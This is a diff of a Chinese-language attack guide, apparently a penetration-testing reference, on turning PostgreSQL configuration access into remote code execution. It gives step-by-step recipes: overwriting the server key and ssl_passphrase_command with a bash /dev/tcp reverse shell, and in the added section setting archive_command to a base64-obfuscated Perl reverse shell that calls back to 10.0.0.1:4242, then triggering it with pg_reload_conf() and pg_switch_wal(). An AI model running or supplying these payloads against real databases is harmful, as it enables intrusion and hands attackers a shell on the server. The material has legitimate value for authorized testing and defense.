@@ -293,11 +293,29 @@ print("    drop function connect_back(text, integer);")
 > + ssl_passphrase_command_supports_reload = off  //如果该属性位于密钥受密码保护的情况下执行的命令将在执行 pg_reload_conf() 时执行
 
 然后，攻击者需要：
-> 1.从服务器转储私钥
-> 2.加密下载的私钥： rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key
-> 3.覆盖
-> 4.转储当前的 postgresql配置
-> 5.使用提到的属性配置覆盖配置：
+> 1. 从服务器转储私钥
+> 2. 加密下载的私钥： rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key
+> 3. 覆盖
+> 4. 转储当前的 postgresql配置
+> 5. 使用提到的属性配置覆盖配置：
     > ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'
     > ssl_passphrase_command_supports_reload = on
-> 6.执行pg_reload_conf()
+> 6. 执行pg_reload_conf()
+
+#### archive_command
+
+配置文件中另一个可利用的属性是archive_command.
+
+为此，archive_mode设置必须为'on'或'always'.我们可以覆盖该命令archive_command并强制它通过 WAL（预写日志记录）操作执行.
+
+一般步骤是：
+
+> 1. 检查归档模式是否开启：SELECT current_setting('archive_mode')
+> 2. 用有效负载覆盖archive_command.例如，反向 shell
+
+```bash
+archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'
+```
+
+> 3. 重新加载配置：SELECT pg_reload_conf()
+> 4. 强制运行 WAL 操作，这将调用归档命令：对于某些 Postgres 版本， SELECT pg_switch_wal() 或 SELECT pg_switch_xlog().
